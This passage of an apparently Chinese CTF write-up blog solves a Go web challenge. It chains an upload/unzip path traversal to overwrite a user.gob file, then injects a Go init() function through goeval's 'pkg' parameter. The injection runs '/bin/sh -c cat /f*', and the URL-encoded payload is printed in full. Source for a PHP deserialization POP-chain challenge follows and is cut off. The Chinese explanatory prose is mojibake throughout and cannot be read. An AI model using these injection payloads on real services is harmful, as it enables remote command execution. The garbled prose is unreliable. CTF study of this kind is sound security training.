class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		fileutil.CreateDir(userUploadDir)</span><br><span class="line">		file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">        <span class="comment">// è¢«è¿‡æ»¤çš„æ–‡ä»¶</span></span><br><span class="line">		<span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		filename := userUploadDir + file.Filename</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">			fileutil.RemoveFile(filename)</span><br><span class="line">		&#125;</span><br><span class="line">		err = c.SaveUploadedFile(file, filename)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">		destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">        <span class="comment">// è§£å‹è·¯å¾„ä¸º/tmp/xxxxxxxxxx/uploads/pathï¼Œå…¶ä¸­pathå¯æ§</span></span><br><span class="line">		<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">			<span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">				err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">			decoder := gob.NewDecoder(file)</span><br><span class="line">			<span class="keyword">var</span> ctfer User</span><br><span class="line">			decoder.Decode(&amp;ctfer)</span><br><span class="line">			<span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">				eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))<span class="comment">// è¿™é‡Œpkgä¹Ÿå¯æ§ï¼Œåªä¸è¿‡é»˜è®¤å€¼æ˜¯fmtï¼Œå¯èƒ½éœ€è¦æˆ‘ä»¬å»è¦†ç›–è°ƒç”¨fmtçš„å†…å®¹</span></span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æé‡ç‚¹åœ¨<code>/upload</code>ï¼Œ<code>/unzip</code>å’Œ<code>/backdoor</code>ã€‚ç”±äºä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ä¸­ä¸èƒ½æœ‰<code>.go</code>å’Œ<code>.gob</code>ï¼ŒåŠ ä¸Šæœ‰ä¸ªè§£å‹åŠŸèƒ½ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘å°†æ¶æ„ä»£ç å†™å…¥ä¸€ä¸ªgoæ–‡ä»¶åè¿›è¡Œå‹ç¼©ï¼Œç„¶åå†è§£å‹åˆ°ä»»æ„è·¯å¾„ä¸‹ï¼Œæœ€åè·å¾—backdoorçš„æƒé™å®ç°getshell</p>
<p>==ï¼ˆpathå¯æ§æ˜¯å› ä¸ºc.Query(â€œpathâ€)ç›¸å½“äº$_GET[â€œpathâ€]ï¼‰==</p>
<h3 id="backdoorçš„æƒé™è·å–"><a href="#backdoorçš„æƒé™è·å–" class="headerlink" title="backdoorçš„æƒé™è·å–"></a>backdoorçš„æƒé™è·å–</h3><p>åˆ†æ<code>/backdoor</code>ï¼Œå‘ç°éœ€è¦user.gobæ¥è¿›è¡Œææƒï¼Œé‚£å°±å¯ä»¥è€ƒè™‘èƒ½ä¸èƒ½è¦†ç›–ã€‚</p>
<p>æ³¨æ„åˆ°<code>/upload</code>ä¸­ä¼šåˆ é™¤ä¹‹å‰å­˜åœ¨çš„åŒåæ–‡ä»¶ï¼Œç„¶åä¸Šä¼ æ–°æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹è¿›è¡Œè¦†ç›–</p>
<p>å¤§è‡´æ€è·¯æ¸…æ¥šäº†ï¼Œæˆ‘ä»¬ç›´æ¥ä¸Šæ‰‹</p>
<p>æ€ä¹ˆç”Ÿæˆæ–‡ä»¶çš„ä»£ç å·²ç»ç»™æˆ‘ä»¬äº†ï¼Œç›´æ¥ç…§æ¬ç…§æŠ„å°±è¡Œ</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gobfile, _ := os.Create(<span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">	user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: <span class="string">&quot;/tmp/c641fceaxxxxxx/&quot;</span>, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">	encoder := gob.NewEncoder(gobfile)</span><br><span class="line">	encoder.Encode(user)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°user.gob</p>
<p>å‹ç¼©åä¸Šä¼ å¹¶è¿›è¡Œè§£å‹</p>
<img src="/2024/03/20/buuctf/buu/image-20240322124104887.png" class="" title="image-20240322124104887">

<p>å»<code>/backdoor</code>çœ‹çœ‹æœ‰æ²¡æœ‰è¦†ç›–æˆåŠŸ</p>
<img src="/2024/03/20/buuctf/buu/image-20240322152548101.png" class="" title="image-20240322152548101">

<p>æˆåŠŸè¦†ç›–</p>
<h3 id="goæ²™ç›’é€ƒé€¸"><a href="#goæ²™ç›’é€ƒé€¸" class="headerlink" title="goæ²™ç›’é€ƒé€¸"></a>goæ²™ç›’é€ƒé€¸</h3><p>è¿™é‡Œå…ˆä¸å…·ä½“è¯´ï¼Œç›®å‰åªéœ€è¦çŸ¥é“è¿™é¢˜ç›®çš„æ¼æ´ç‚¹åœ¨<code>eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>å°±å¯ä»¥äº†ã€‚</p>
<p>åœ¨goä¸­ï¼Œç³»ç»Ÿæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ä¸€èˆ¬æ˜¯<code>main()</code>ï¼Œä½†æ˜¯<code>init()</code>æ˜¯ä¸ªä¾‹å¤–ï¼Œå®ƒèƒ½åœ¨<code>main()</code>ä¹‹å‰è°ƒç”¨</p>
<p>æ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™è„šæœ¬äº†</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;whoami&quot;)</span></span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /f*&quot;</span>)</span><br><span class="line">	res, err := cmd.CombinedOutput()</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">	fmt.Println(<span class="type">string</span>(res))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	Message = <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯<code>import (</code>åé¢çš„ä¸€éƒ¨åˆ†ï¼Œgoevalçš„æºç <a target="_blank" rel="noopener" href="https://github.com/PaulXu-cn/goeval/blob/main/eval.go">åœ¨è¿™é‡Œ</a>ï¼Œå¯ä»¥æƒ³æƒ³ä¸ºä»€ä¹ˆ</p>
<p>:::info</p>
<p>å®é™…ä¸Šåœ¨æºç çš„<code>func main()</code>ä¸­ï¼Œä¼ å…¥çš„åŒ…æ˜¯ä»¥ä¾æ¬¡æ‹¼æ¥çš„å½¢å¼æ„æˆçš„ï¼Œè€Œåœ¨å¼€å§‹æ—¶importStrå°±å·²ç»è¢«å®šä¹‰æˆäº†<code>import (</code>äº†ï¼Œä¼ å…¥çš„æ•°æ®ä¼šä¾æ¬¡æ‹¼æ¥åœ¨å®ƒåé¢ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ³¨æ„æ€ä¹ˆé—­åˆç¬¦å·å³å¯</p>
<p>:::</p>
<p>æä¸€å¥ï¼Œæœ€åä¸€éƒ¨åˆ†åŠ constä¹Ÿæ˜¯ä¸ºäº†é—­åˆåé¢çš„â€)ï¼Œç„¶åå°†å…¶ç¨å¾®ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os/exec&quot;%0A&quot;fmt&quot;)%0Afunc%09init()%7B%0Acmd:=exec.Command(&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat$&#123;IFS&#125;/f*&quot;)%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A&#125;%0Aconst(%0AMessage=&quot;fmt</span><br></pre></td></tr></table></figure>

<img src="/2024/03/20/buuctf/buu/image-20240322163156511.png" class="" title="image-20240322163156511">

<p>pythonè„šæœ¬å°†asciiç è½¬æ¢ä¸ºchrå³å¯</p>
<h2 id="VNCTF2023-è±¡æ£‹ç‹å­"><a href="#VNCTF2023-è±¡æ£‹ç‹å­" class="headerlink" title="[VNCTF2023]è±¡æ£‹ç‹å­"></a>[VNCTF2023]è±¡æ£‹ç‹å­</h2><p>ç­¾åˆ°éš¾åº¦çš„jsfuckï¼Œæ‰¾åˆ°å¯¹åº”ä»£ç åæ”¾åˆ°æ§åˆ¶å°printå°±è¡Œ</p>
<img src="/2024/03/20/buuctf/buu/image-20240322163824019.png" class="" title="image-20240322163824019">

<h2 id="DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›ï¼-EasyPOP"><a href="#DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›ï¼-EasyPOP" class="headerlink" title="[DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›ï¼]EasyPOP"></a>[DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›ï¼]EasyPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span 